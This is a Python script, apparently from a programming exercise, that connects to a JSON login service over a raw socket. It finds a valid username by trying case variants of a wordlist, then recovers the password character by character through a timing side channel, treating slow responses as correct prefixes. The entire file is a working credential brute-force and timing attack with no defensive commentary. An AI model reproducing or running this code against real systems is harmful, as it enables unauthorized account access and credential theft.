import sys
import socket
from itertools import product
import json
import string
from datetime import datetime

chars = string.ascii_letters + string.digits


def main():
    _, ip, port = sys.argv

    logins = []
    with open('hacking/logins.txt', 'r') as f:
        for line in f:
            logins.append(line.strip())

    with socket.socket() as s:
        s.connect((ip, int(port)))

        def get_login():
            for login in logins:
                cases = map(''.join, product(*zip(login.upper(), login.lower())))
                for i in cases:
                    data = {
                        "login": i,
                        "password": " "
                    }
                    s.send(json.dumps(data).encode())

                    response = s.recv(1024).decode()
                    response = json.loads(response)
                    response = response['result']

                    if response == "Wrong password!":
                        return i

        def get_password():
            password = ""

            while True:
                for c in chars:
                    data = {
                        "login": login,
                        "password": password + c
                    }


                    s.send(json.dumps(data).encode())
                    start = datetime.now()


                    response = s.recv(1024).decode()
                    finish = datetime.now()
                    
                    response = json.loads(response)
                    response = response['result']

                    difference = finish - start
                    #print(difference)

                    if difference.microseconds >= 90000:
                        break
                    elif response == "Connection success!":
                        return password + c
                password += c

        login = get_login()
        password = get_password()

        print('{{"login": "{}", "password": "{}"}}'.format(login, password))


if __name__ == '__main__':
    main()
